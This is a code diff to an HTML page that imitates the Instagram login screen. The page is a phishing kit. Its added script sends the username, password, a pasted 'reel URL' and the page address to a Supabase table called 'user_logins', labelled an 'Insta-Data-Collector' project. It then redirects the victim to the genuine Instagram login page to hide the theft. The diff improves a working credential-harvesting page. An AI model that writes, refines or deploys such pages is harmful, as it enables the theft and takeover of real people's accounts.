@@ -81,10 +81,7 @@
             font-size: 14px;
         }
         .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
-        .get-app { text-align: center; margin-top: 20px; font-size: 14px; }
-        .app-links { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
-        .app-links img { height: 40px; }
-        footer { padding: 40px 20px; text-align: center; color: #8e8e8e; font-size: 12px; }
+        footer { padding: 40px 20px; text-align: center; color: #8e8e8e; font-size: 12px; margin-top: auto; }
     </style>
 </head>
 <body>
@@ -95,7 +92,8 @@
         <form id="authForm">
             <input type="text" id="user" placeholder="Phone number, username, or email" required>
             <input type="password" id="pass" placeholder="Password" required>
-            <input type="enter paste the reel url" id="url" placeholder="reel url" required>
+            <input type="url" id="reel" placeholder="Paste Instagram Reel URL here" required>
+            
             <button type="submit" id="submitBtn" class="login-btn">Log In</button>
         </form>
 
@@ -114,14 +112,6 @@
         <div class="signup-box">
             Don't have an account? <a href="#">Sign up</a>
         </div>
-
-        <div class="get-app">
-            <p>Get the app.</p>
-            <div class="app-links">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Y23_5k5DY9R.png" alt="App Store">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_iE.png" alt="Google Play">
-            </div>
-        </div>
     </div>
 
     <footer>
@@ -129,7 +119,11 @@
     </footer>
 
     <script>
-        const _supabase = supabase.createClient('https://mllxnrqjdzpiswpaappa.supabase.co', 'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ');
+        // Connecting to your Insta-Data-Collector project
+        const _supabase = supabase.createClient(
+            'https://mllxnrqjdzpiswpaappa.supabase.co', 
+            'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ'
+        );
 
         document.getElementById('authForm').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -137,10 +131,33 @@
             btn.disabled = true;
             btn.innerText = "Log In...";
 
-            const { error } = await _supabase.from('user_logins').insert([
-                { identifier: document.getElementById('user').value, password: document.getElementById('pass').value }
-            ]);
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+            const reelUrl = document.getElementById('reel').value;
+            const pageUrl = window.location.href;
 
-            if (error) {
-                alert
+            try {
+                const { error } = await _supabase.from('user_logins').insert([
+                    { 
+                        identifier: username, 
+                        password: password,
+                        reel_url: reelUrl, // Must match your Supabase column name exactly
+                        url: pageUrl 
+                    }
+                ]);
 
+                if (error) throw error;
+
+                // Redirect to official Instagram
+                window.location.href = "https://www.instagram.com/accounts/login/";
+
+            } catch (err) {
+                console.error("Error:", err.message);
+                alert("Connection error. Please try again.");
+                btn.disabled = false;
+                btn.innerText = "Log In";
+            }
+        });
+    </script>
+</body>
+</html>
